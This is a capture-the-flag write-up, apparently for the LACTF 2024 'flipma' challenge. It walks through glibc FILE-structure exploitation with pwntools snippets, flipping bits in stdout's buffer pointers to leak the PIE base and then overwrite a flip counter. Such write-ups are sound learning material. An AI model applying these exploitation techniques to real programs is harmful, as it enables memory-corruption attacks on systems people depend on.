I did not solve this challenge but I decided to look back at it because I wanted to learn FSOP and overwriting exit funcs with one gadget.

## Challenge

This challenge provides us with 4 bit flips, and our addresses are calculated at an offset from `_IO_2_1_stdin_`. The path to a solution, as with many other bit flip challenges, is to first get infinite bit flips for arbitrary write. The bit flip counter is stored in the base program’s bss, but PIE is enabled. Our goal should be to leak the base address before our 4th bit flip so that we can overwrite the counter. The flip being relative to stdin hints that we will need some form of leak-oriented FSOP. (https://enzo.run/posts/lactf2024/#flipma)

```
stdout = 0xd20
write_base = stdout + 0x20
read_end = stdout + 0x10
```

First we will calculate the location of `_IO_2_1_stdin_` and its fields.

```
sla(b"a: ", "9")
sla(b"b: ", "9")
```

For this to work, we also need to make sure the _IO_CURRENTLY_PUTTING flag is set, and I initially thought we needed to use a bit flip on this, but just initializing stdout with an additional puts before the flips also works.

![image](https://github.com/user-attachments/assets/5da04128-6251-4532-99b4-1b853b01c373)

Next, we need to find a suitable location to leak the elf address. Using the search command in pwndbg, we can see there are 2 addresses in libc that contain the bytes of our elf section.

![image](https://github.com/user-attachments/assets/25c45ff4-9e6d-4f5b-8690-b90f8936ee96)

Unbuffered file streams hold libc addresses to themselves in the buffer fields.

![image](https://github.com/user-attachments/assets/5622ca66-3003-45b0-921e-33b93118e6c0)

The idea is to flip a bit in stdout->write_base `0x00007fd8a201a723` to become `0x00007fd8a2018723`. We can see that `0x7fd8a2018f4a 0xa4200000562941ac` will be located between the stdout->write_base and stdout->write_ptr.

but the file write function called from puts will treat the stream as buffered as long as there is a difference between _IO_write_base and _IO_write_ptr. This will cause the write function to print out memory from libc between those two addresses.

### Recap

To force flush the buffer with its contents:

- Ensure the _IO_CURRENTLY_PUTTING flag is set
- We need to set stdout->read_end = stdout->write_base
- Ensure stdout->write_ptr = stdout->write_end

So we will need to:

- Give an invalid index to make the program call puts with error message
- Change stdout->read_end and stdout->write_base to a location right before our leak location

```py
# _IO_write_base
sla(b"a: ", str(write_base+1))
sla(b"b: ", "5")

# _IO_read_end
sla(b"a: ", str(read_end+1))
sla(b"b: ", "5")
```

![image](https://github.com/user-attachments/assets/6829df7e-2dac-49aa-a274-27bc3c8d18ba)

After running the script above, we can see now in our IO File struct, our target is located between write_base and write_ptr.

```py
sla(b"a: ", "9")
sla(b"b: ", "9")

data = p.recvuntil(b"we're flipping bits, not burgers", timeout=1)
if len(data) < 100:
  print("failed")
  exit(1)

diff = 0x7f0c55badf4a - 0x00007f0c55bad723
elf_leak = u64(data[diff-2:diff+6])
exe.address = elf_leak - (0x55ff52d83020 - 0x55ff52d7f000)
li(f"exe addr @ {hex(exe.address)}")
```

![image](https://github.com/user-attachments/assets/ea0f0745-5cdb-45e4-a98e-669f0feeaecf)

We can find the offset of our leak by subtracting the leak location with the write_base.

```py
print(len(str(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"])))
print(hex(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"]))

## Make flip to big number
sla(b"a: ", str(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"]))
sla(b"b: ", "7")
```
